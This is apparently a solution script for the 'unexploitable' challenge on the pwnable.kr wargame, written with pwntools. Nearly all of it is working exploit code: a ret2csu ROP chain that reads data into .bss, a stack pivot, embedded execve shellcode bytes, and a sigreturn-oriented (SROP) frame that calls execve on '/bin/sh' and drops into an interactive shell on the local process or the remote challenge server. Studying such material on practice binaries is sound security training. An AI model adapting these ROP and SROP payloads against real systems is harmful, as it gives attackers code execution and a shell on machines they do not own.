from pwn import *
import time

context.clear(arch="amd64")
LOCAL = True

def mt_send(io, data):
    io.send(data)
    time.sleep(3)

# main vuln address define
main_vuln_addr = 0x400544
rop64_step1_addr = 0x4005E6
rop64_step2_addr = 0x4005D0
rop_pad_size = 0x38
syscall_addr = 0x400560
bss_addr = 0x601030 + 0x100
pop_rbp_addr = 0x400654
leave_addr = 0x400576

# start pwn
elf = ELF("./unexploitable")
if LOCAL:
    context.log_level = 'debug'
    io = process("./unexploitable")
else:
    io = remote("pwnable.kr", 22333)

def prod_rop3(func_addr, arg1, arg2, arg3):
    payload = p64(rop64_step1_addr)
    payload += p64(0)
    payload += p64(0)   # rbx
    payload += p64(1)   # rbp
    payload += p64(func_addr)   # r12
    payload += p64(arg1)        # r13
    payload += p64(arg2)        # r14
    payload += p64(arg3)        # r15
    payload += p64(rop64_step2_addr)    # ret to step2
    payload += 'r'*rop_pad_size         # padding
    return payload

def sm_func(func_id, marg0, marg1, marg2, mstack):
    mframe = SigreturnFrame()
    mframe.rax = func_id
    mframe.rdi = marg0
    mframe.rsi = marg1
    mframe.rdx = marg2
    mframe.rsp = mstack
    mframe.rip = syscall_addr
    return str(mframe)

def un_exp():
    # write binsh
    payload = 'p'*0x18
    payload += prod_rop3(elf.got['read'], 0, bss_addr, 0x200)
    payload += p64(pop_rbp_addr)      # return to main vuln
    payload += p64(bss_addr+0x100)
    payload += p64(leave_addr)
    mt_send(io, payload)
    #raw_input("start")
    payload = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05".ljust(0x40, chr(0))
    payload += "/bin/sh"
    payload = payload.ljust(0x100, chr(0))
    payload += p64(main_vuln_addr)
    payload += p64(main_vuln_addr)
    mt_send(io, payload)
    # execve
    payload = '2'*0x18
    payload += p64(main_vuln_addr)
    payload += p64(syscall_addr)
    payload += sm_func(constants.SYS_execve, bss_addr+0x40, 0, 0, bss_addr+0x100)
    #payload += sm_func(constants.SYS_write, 1, bss_addr+0x40, 8, bss_addr+0x100)
    mt_send(io, payload)
    payload = 'e'*0x0F
    #raw_input("wait")
    mt_send(io, payload)
    io.interactive()
    #io.recv(4)

if __name__ == '__main__':
    un_exp()
    raw_input("end")


